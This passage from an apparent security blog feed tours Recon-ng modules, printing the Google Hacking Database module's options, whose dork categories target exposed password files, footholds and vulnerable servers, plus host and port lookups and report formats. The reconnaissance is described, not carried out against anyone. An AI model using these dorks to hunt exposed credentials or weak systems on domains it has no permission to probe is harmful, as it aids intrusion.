and the &lsquo;site&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
</ul>


<p>This module is massive! Basically, you get Google dorks inside Recon-ng!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][ghdb] &gt; show info
</span><span class='line'>
</span><span class='line'>      Name: Google Hacking Database
</span><span class='line'>      Path: modules/recon/domains-vulnerabilities/ghdb.py
</span><span class='line'>    Author: Tim Tomes (@LaNMaSteR53)
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
</span><span class='line'>  and the 'site' search operator. Updates the 'vulnerabilities' table with the results.
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  Name                                 Current Value  Required  Description
</span><span class='line'>  -----------------------------------  -------------  --------  -----------
</span><span class='line'>  DORKS                                               no        file containing an alternate list of Google dorks
</span><span class='line'>  GHDB_ADVISORIES_AND_VULNERABILITIES  False          yes       enable/disable the 1996 dorks in this category
</span><span class='line'>  GHDB_ERROR_MESSAGES                  False          yes       enable/disable the 93 dorks in this category
</span><span class='line'>  GHDB_FILES_CONTAINING_JUICY_INFO     False          yes       enable/disable the 366 dorks in this category
</span><span class='line'>  GHDB_FILES_CONTAINING_PASSWORDS      False          yes       enable/disable the 199 dorks in this category
</span><span class='line'>  GHDB_FILES_CONTAINING_USERNAMES      False          yes       enable/disable the 17 dorks in this category
</span><span class='line'>  GHDB_FOOTHOLDS                       False          yes       enable/disable the 49 dorks in this category
</span><span class='line'>  GHDB_NETWORK_OR_VULNERABILITY_DATA   False          yes       enable/disable the 63 dorks in this category
</span><span class='line'>  GHDB_PAGES_CONTAINING_LOGIN_PORTALS  False          yes       enable/disable the 372 dorks in this category
</span><span class='line'>  GHDB_SENSITIVE_DIRECTORIES           False          yes       enable/disable the 119 dorks in this category
</span><span class='line'>  GHDB_SENSITIVE_ONLINE_SHOPPING_INFO  False          yes       enable/disable the 11 dorks in this category
</span><span class='line'>  GHDB_VARIOUS_ONLINE_DEVICES          False          yes       enable/disable the 307 dorks in this category
</span><span class='line'>  GHDB_VULNERABLE_FILES                False          yes       enable/disable the 62 dorks in this category
</span><span class='line'>  GHDB_VULNERABLE_SERVERS              False          yes       enable/disable the 83 dorks in this category
</span><span class='line'>  GHDB_WEB_SERVER_DETECTION            False          yes       enable/disable the 77 dorks in this category
</span><span class='line'>  SOURCE                               default        yes       source of input (see 'show info' for details)
</span><span class='line'>
</span><span class='line'>Source Options:
</span><span class='line'>  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL
</span><span class='line'>  &lt;string&gt;       string representing a single input
</span><span class='line'>  &lt;path&gt;         path to a file containing a list of inputs
</span><span class='line'>  query &lt;sql&gt;    database query returning one column of inputs
</span><span class='line'>
</span><span class='line'>Comments:
</span><span class='line'>  * Special thanks to the Offenvise Security crew for maintaining the GHDB and making it available to
</span><span class='line'>  open source projects like Recon-ng. Thanks Muts!</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>SSLTools.com Host Name Lookups &ndash; Uses the ssltools.com site to obtain host names from a site&rsquo;s SSL certificate metadata to update the
&lsquo;hosts&rsquo; table.  Security issues with the certificate trust are pushed to the &lsquo;vulnerabilities&rsquo;
table.</p></li>
<li><p>censys.io port lookup by netblock &ndash; Queries censys.io to enumerate open ports for a netblock</p></li>
</ul>


<h2>Reporting</h2>

<ul>
<li><p>CSV File Creator &ndash; Creates a CSV file containing the specified harvested data</p></li>
<li><p>HTML Report Generator &ndash; Creates a HTML report</p></li>
</ul>


<p>I really liked the HTML report format. It classifies data into:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>domains  
</span><span class='line'>companies 
</span><span class='line'>netblocks 
</span><span class='line'>locations 
</span><span class='line'>vulnerabilities   
</span><span class='line'>ports 
</span><span class='line'>hosts 
</span><span class='line'>contacts  
</span><span class='line'>credentials   
</span><span class='line'>leaks 
</span><span class='line'>pushpins  
</span><span class='line'>profiles  
</span><span class='line'>repositories</span></code></pre></td></tr></table></div></figure>


<p></p>

<ul>
<li><p>JSON Report Generator &ndash; Creates a JSON report.</p></li>
<li><p>List Creator &ndash; Creates a file containing a list of records from the database</p></li>
<li><p>PushPin Report Generator &ndash; Creates HTML media and map reports for all of the PushPins stored in the database.</p></li>
<li><p>XLSX File Creator &ndash; Creates an Excel compatible XLSX file containing the entire data set</p></li>
<li><p>XML Report Generator -Creates a XML report</p></li>
</ul>


<p>It took a while to list everything! As you could see, the Recon-ng framework is an information gathering tool on steroids! And if you can&rsquo;t find what you need among the current modules, you can write your own and contribute!</p>

<p>Until next time, here&rsquo;s the cookie straight from the cow&rsquo;s mouth:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ______________________________________
</span><span class='line'>/ Q: How did you get into artificial   \
</span><span class='line'>| intelligence? A: Seemed logical -- I |
</span><span class='line'>\ didn't have any real intelligence.   /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
</feed>
